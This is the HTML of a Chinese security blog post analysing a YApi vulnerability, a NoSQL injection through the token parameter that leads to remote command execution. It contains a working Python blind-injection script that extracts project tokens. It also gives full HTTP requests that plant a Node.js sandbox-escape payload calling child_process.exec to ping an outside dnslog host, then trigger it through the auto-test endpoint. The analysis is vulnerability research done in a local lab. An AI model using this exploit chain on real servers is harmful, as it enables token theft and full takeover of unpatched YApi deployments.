@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>YApi分析从NoSQL注入到RCE远程命令执行.md | Zeo's Security Lab</title><meta name="author" content="Zeo"><meta name="copyright" content="Zeo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="0x00 前提这个是前几个月的漏洞，之前爆出来发现没人分析就看了一下，也写了一片 Nosql注入的文章，最近生病在家，把这个写一半的完善一下发出来吧。 0x01 介绍YApi是一个可本地部署的、打通前后端及QA的、可视化的接口管理平台。  YApi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YAp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="YApi分析从NoSQL注入到RCE远程命令执行.md">
+<meta property="og:url" content="https://godzeo.github.io/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/index.html">
+<meta property="og:site_name" content="Zeo&#39;s Security Lab">
+<meta property="og:description" content="0x00 前提这个是前几个月的漏洞，之前爆出来发现没人分析就看了一下，也写了一片 Nosql注入的文章，最近生病在家，把这个写一半的完善一下发出来吧。 0x01 介绍YApi是一个可本地部署的、打通前后端及QA的、可视化的接口管理平台。  YApi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YAp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152204342.png">
+<meta property="article:published_time" content="2023-03-05T01:48:54.000Z">
+<meta property="article:modified_time" content="2023-03-10T13:31:50.174Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="nosql git">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152204342.png"><link rel="shortcut icon" href="/img/WX20211124-162855.png"><link rel="canonical" href="https://godzeo.github.io/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'YApi分析从NoSQL注入到RCE远程命令执行.md',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-10 21:31:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zeo's Security Lab" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">132</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152204342.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Zeo's Security Lab</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">YApi分析从NoSQL注入到RCE远程命令执行.md</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-05T01:48:54.000Z" title="发表于 2023-03-05 09:48:54">2023-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-10T13:31:50.174Z" title="更新于 2023-03-10 21:31:50">2023-03-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/yapi/">yapi</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>
+
+<h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>这个是前几个月的漏洞，之前爆出来发现没人分析就看了一下，也写了一片 Nosql注入的文章，最近生病在家，把这个写一半的完善一下发出来吧。</p>
+<h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>YApi是一个可本地部署的、打通前后端及QA的、可视化的接口管理平台。</p>
+<blockquote>
+<p>YApi 是<strong>高效</strong>、<strong>易用</strong>、<strong>功能强大</strong>的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。在其1.12.0版本之前，存在一处NoSQL注入漏洞，通过该漏洞攻击者可以窃取项目Token，并利用这个Token执行任意Mock脚本，获取服务器权限。</p>
+<p>[YMFE&#x2F;yapi: YApi 是一个可本地部署的、打通前后端及QA的、可视化的接口管理平台 (github.com)]</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/YMFE/yapi">https://github.com/YMFE/yapi</a></p>
+</blockquote>
+<p>当时年底爆出来的从未授权注入到rce的利用，就是从一个buffix出来的，就是下面这个链接</p>
+<p>参考链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c">https://github.com/YMFE/yapi/commit/59bade3a8a43e7db077d38a4b0c7c584f30ddf8c</a></li>
+</ul>
+<blockquote>
+<p>Bugfix 2022 11 01 (<a target="_blank" rel="noopener" href="https://github.com/YMFE/yapi/pull/2628">#2628</a>)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* fix: 修复【Mongo 注入获取 token】的问题</span><br><span class="line"></span><br><span class="line">* chore: up version</span><br><span class="line"></span><br><span class="line">* chore: 关闭 Pre-request Script 和 Pre-response Script</span><br><span class="line"></span><br><span class="line">v1.11.0 之后 如下脚本功能关闭,如需打开,请联系管理员添加. 在 db, mail 同级配置 scriptEnable: true, 并重启服务 即可</span><br><span class="line"></span><br><span class="line">Co-authored-by: ariesly &lt;ariesly@arieslymac13.local&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="0x02-环境"><a href="#0x02-环境" class="headerlink" title="0x02 环境"></a>0x02 环境</h1><p>当时自己搭建的环境，起一个docker 的 mongo，本地起一个yapi</p>
+<blockquote>
+<p>自己手动搭建, 注意要自己下载带漏洞的版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> yapi</span><br><span class="line"><span class="built_in">cd</span> yapi</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/YMFE/yapi.git vendors //或者下载 zip 包解压到 vendors 目录（<span class="built_in">clone</span> 整个仓库大概 140+ M，可以通过 `git <span class="built_in">clone</span> --depth=1 https://github.com/YMFE/yapi.git vendors` 命令减少，大概 10+ M）</span><br><span class="line"><span class="built_in">cp</span> vendors/config_example.json ./config.json //复制完成后请修改相关配置</span><br><span class="line"><span class="built_in">cd</span> vendors</span><br><span class="line"></span><br><span class="line">yapi server </span><br><span class="line">访问 在浏览器打开 http://0.0.0.0:9090 访问。非本地服务器，请将 0.0.0.0 替换成指定的域名或ip </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>其实也可以直接调试P师傅的环境，也是十分方便的，因为自己装确实有好几个bug，卡了半天。</p>
+<h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>首先看到是补丁，补丁感觉修复的东西就几行，重要的就这个？</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ee32d745a94046ad7e635df6c04de0b6.png" alt="image-20230226164022841"></p>
+<p>加了一行判断，要token为string</p>
+<p>问题来了，正常应用的话，token难道不都是String吗？这个其实我一开始也没看明白</p>
+<p>但是我们了解 Nosql注入之后，就知道是哪一种情况，基本上就传入了一个数组导致的问题</p>
+<p>而且也定位了 token 这个参数出现了问题，那先把注入搞定</p>
+<h1 id="0x04-注入"><a href="#0x04-注入" class="headerlink" title="0x04 注入"></a>0x04 注入</h1><p>直接打断点，然后看一下路由，哪些路由回到这边</p>
+<p>而且这中文注释，很清楚了吧,haiy</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e0c9f5c0317a7238dddad7f1e10358d2.png" alt="image-20230226170626250"></p>
+<p>最后跟到getProjectIdByToken里面，最后是一个mango 的sql查询了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/380484e613e603b34fe3fcc5136c2bb3.png" alt="image-20230226170540041"></p>
+<p>这里其实看似是没有问题的，因为是一个预编译的情况</p>
+<p>但是这里是 mongo注入的经典情况，可以传入一个数组 , 就可以构成一个注入了</p>
+<h1 id="0x05-如何传入一个数组"><a href="#0x05-如何传入一个数组" class="headerlink" title="0x05 如何传入一个数组"></a>0x05 如何传入一个数组</h1><p>直接构造一下试一下</p>
+<p><code>GET /api/project/get?token=&#123;&quot;token&quot;:&#123;&quot;$regex&quot;:&quot;^1&quot;&#125;&#125; HTTP/1.1</code></p>
+<p>答案显然是不行的</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/90f9f4b97f454e30a106dafc17f6f433.png" alt="image-20230226205206908"></p>
+<p>这里yapi用的是一个叫 koa web的通用web框架，</p>
+<p>那么利用 koa web框架 中会解析 json格式，转化为一个数组</p>
+<p>我们主要需要 Content-Type: application&#x2F;json</p>
+<p>就可以解析json转化为数组，最终成为成功传入数组</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3e41ffd96175ad976f9f3f33f86ce71e.png" alt="image-20230226205305333"></p>
+<h1 id="0x06-注入判断"><a href="#0x06-注入判断" class="headerlink" title="0x06 注入判断"></a>0x06 注入判断</h1><p>正确的情况：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/39683c4869e371b6e81548f9ec304198.png" alt="image-20230226203312035"></p>
+<p>错误的情况：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6e1f71c712f78dc580c38c94bf321991.png" alt="image-20230226203415266"></p>
+<p>那么就是一个标准的盲注情况，写个poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:3333/api/plugin/export&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">json_data = &#123;</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;$regex&quot;</span>:<span class="string">&quot;^&quot;</span>+token</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:</span><br><span class="line">            json_data = &#123;</span><br><span class="line">                <span class="string">&quot;token&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;^&quot;</span> + token+word</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url=target,json=json_data, )</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;html&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Found one more char : %s&quot;</span> % (token+word))</span><br><span class="line">                token += word</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4706335ecca87fdf094a680d0d623a21.png" alt="image-20230226204604890"></p>
+<h1 id="0x07-Token转换"><a href="#0x07-Token转换" class="headerlink" title="0x07 Token转换"></a>0x07 Token转换</h1><p>因为我们发现我， 注入出来的这个token不对的</p>
+<p>明显和真实的token长度都不一样吗</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/267053455c83e980e562d17591fcb658.png" alt="image-20230226210758937"></p>
+<p>那么应该还有一个转化的步骤，当传递过来的token后，会先进行一次aseDecode方法</p>
+<p>随后获取到正确的uid 才能正常后续的操作。</p>
+<p>如果解密失败，就会默认给一个99999，就是没权限。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/16673322463061c96916f97b8ed5048e.png" alt="image-20230226215315527"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bdc92a4843c399c7d34e36fcdcc582ef.png" alt="image-20230226215331255"></p>
+<p>那么我们先解决第一个解密的问题，还是一个硬编码 <code>abcde</code></p>
+<p>所以就来一个对应的加密脚本</p>
+<h1 id="0x08-RCE的原理"><a href="#0x08-RCE的原理" class="headerlink" title="0x08 RCE的原理"></a>0x08 RCE的原理</h1><p>那肯定是要利用这个token来做文章了</p>
+<p>那么他可以做什么？ 明显要看一下运行自动化测试这个东西</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/34b6e0afed46f0623f4fbef70967b45f.png" alt="image-20230226223121849"></p>
+<p>看了一下，只是运行一个项目，需要一个 id 的参数，那这个应该是最后触发的条件。</p>
+<p>然后发现这里可以加入脚步</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6e8be84dd2393526e3ac74497cfd8b90.png" alt="image-20230226223450460"></p>
+<p>测试一下，可以正常触发</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b6e6e64c1bf77d292be51994c4986525.png" alt="image-20230226225911588"></p>
+<p>可以利用</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/aea776630f2361c557517e69c464ed22.png" alt="image-20230226230022692"></p>
+<p>那么rce的利用流程大概就是这几步</p>
+<p>1.注入获取token</p>
+<p>2.添加任意测试用例</p>
+<p>3.修改项目Pre-response Script脚本</p>
+<p>4.调用&#x2F;api&#x2F;open&#x2F;run_auto_test，</p>
+<p>5.完成RCE。</p>
+<h1 id="0x09-爆破一下"><a href="#0x09-爆破一下" class="headerlink" title="0x09 爆破一下"></a>0x09 爆破一下</h1><p>那么现在就是一个要往里面设置payload，</p>
+<p>就是要获得这个项目ID，其实还需要用户ID</p>
+<p>但是好处是这两个ID都是小数，可以直接爆破</p>
+<p>爆破项目project_id，可以用这个接口，也有其他接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:3000/api/project/get?id=1&amp;token=fa460e433974ede4c04a51ae145cf2d72ca677854de766775200c983d8e3c1d1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f1740d62f76775f65a4c394dd8946475.png" alt="image-20230228214625411"></p>
+<p>这个接口上传脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /api/project/up HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3333</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:3333/prd/index@40d464d7fa4bb1bea815.css</span><br><span class="line">Sec-Fetch-Dest: font</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 221</span><br><span class="line"></span><br><span class="line">id=66&amp;token=fa460e433974ede4c04a51ae145cf2d72ca677854de766775200c983d8e3c1d1&amp;after_script=&amp;pre_script=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&#x27;child_process&#x27;).exec(&#x27;ping 6666.rwzdkn.dnslog.cn&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d43760e8489e3ffcb3f2e7730dad0d85.png" alt="image-20230228214208379"></p>
+<p>最后，运行脚本，触发命令执行，结束</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /api/open/run_auto_test HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3333</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:3333/prd/index@40d464d7fa4bb1bea815.css</span><br><span class="line">Sec-Fetch-Dest: font</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 88</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;id&quot;:&quot;66&quot;,&quot;token&quot;:&quot;fa460e433974ede4c04a51ae145cf2d72ca677854de766775200c983d8e3c1d1&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a00064c58e5c3640f4b0fc5aac136fbc.png" alt="image-20230228214836471"></p>
+<h1 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h1><p>其实RCE这个问题，属于后台利用吧，是nodejs的vm模块出现的问题</p>
+<p>主要还是在于项目的 token可以被注入出来，那么就可以任意操作项目了，那存在这种可以执行脚本的模块也是</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://godzeo.github.io">Zeo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://godzeo.github.io/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/">https://godzeo.github.io/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://godzeo.github.io" target="_blank">Zeo's Security Lab</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/nosql-git/">nosql git</a></div><div class="post_share"><div class="social-share" data-image="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152204342.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/02/25/OAuth%202.0%20%E8%AE%A4%E8%AF%81%E5%92%8C%E6%94%BB%E5%87%BB%E9%9D%A2/"><img class="next-cover" src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154457.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">OAuth 2.0 认证和攻击面</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com/old/202210231013354.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zeo</div><div class="author-info__description">专注于安全,分享生活,分享知识</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">132</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/godzeo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/godzeo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:zzzhhhaaaiiii@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Weclome my blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E6%8F%90"><span class="toc-number">1.</span> <span class="toc-text">0x00 前提</span></a></li><li class="toc-item toc-level-1"><a 